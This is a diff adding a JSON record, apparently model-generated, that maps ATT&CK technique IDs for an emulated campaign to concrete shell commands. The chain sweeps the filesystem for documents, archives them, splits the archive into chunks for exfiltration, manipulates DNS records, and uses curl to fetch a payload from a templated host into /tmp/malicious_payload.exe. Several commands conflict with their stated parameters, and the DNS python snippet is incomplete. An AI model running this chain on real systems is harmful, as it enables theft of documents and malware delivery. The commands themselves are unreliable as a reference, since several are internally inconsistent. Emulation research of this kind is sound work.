@@ -1,0 +1,78 @@
+{
+  "campaign_id": "C0026",
+  "model": "gpt-oss:20b",
+  "sample": 2,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-register",
+      "command": "python -c \"import dns.resolver; import dns.update; upd=dns.update.Update('example.com'); upd.add('newsub.example.com','3600','A','1.2.3.4'); dns.query.tcp(upd,'8.8.8.8')\"",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "newsub.example.com",
+        "ip_address": "192.0.2.123",
+        "dns_server": "203.0.113.1"
+      }
+    },
+    {
+      "technique_id": "T1005",
+      "mechanism": "file-collection",
+      "command": "find / -type f \\( -iname '*.docx' -o -iname '*.pdf' \\) -printf '%p\\n' > /tmp/collected_files.txt",
+      "target": "target.primary",
+      "parameters": {
+        "search_path": "/",
+        "output_file": "/tmp/collected_files.txt"
+      }
+    },
+    {
+      "technique_id": "T1560.001",
+      "mechanism": "archive-utility",
+      "command": "tar -czf /tmp/docs_archive.tar.gz -C /tmp $(cat /tmp/collected_files.txt | tr '\\n' ' ')",
+      "target": "target.primary",
+      "parameters": {
+        "archive_path": "/tmp/docs_archive.tar.gz",
+        "source_file_list": "/tmp/collected_files.txt"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "http-get",
+      "command": "curl -sSL http://$(endpoint.public_service)/payload.bin -o /tmp/malicious_payload.exe",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://web_asset.benign_landing/payload.bin",
+        "output_path": "/tmp/malicious_payload.exe"
+      }
+    },
+    {
+      "technique_id": "T1568",
+      "mechanism": "dns-update",
+      "command": "nsupdate -k /etc/bind/key.txt <<EOF\nserver 203.0.113.1\nzone example.com.\nupdate add newdynamic.example.com. 3600 A 192.0.2.123\nsend\nEOF",
+      "target": "actor.primary",
+      "parameters": {
+        "dns_zone": "example.com.",
+        "subdomain": "newdynamic.example.com.",
+        "record_type": "A",
+        "record_value": "192.0.2.123",
+        "nameserver": "203.0.113.1",
+        "key_file": "/etc/bind/key.txt"
+      }
+    },
+    {
+      "technique_id": "T1030",
+      "mechanism": "split-archive",
+      "command": "split -b 3072000 /tmp/docs_archive.tar.gz /tmp/part_",
+      "target": "target.primary",
+      "parameters": {
+        "input_file": "/tmp/docs_archive.tar.gz",
+        "output_prefix": "/tmp/part_",
+        "chunk_size_bytes": "3072000"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "2015c43ab1a7d3862806092398ed530ec1a12f601f19fbbdd0fdcca6005872d9"
+}
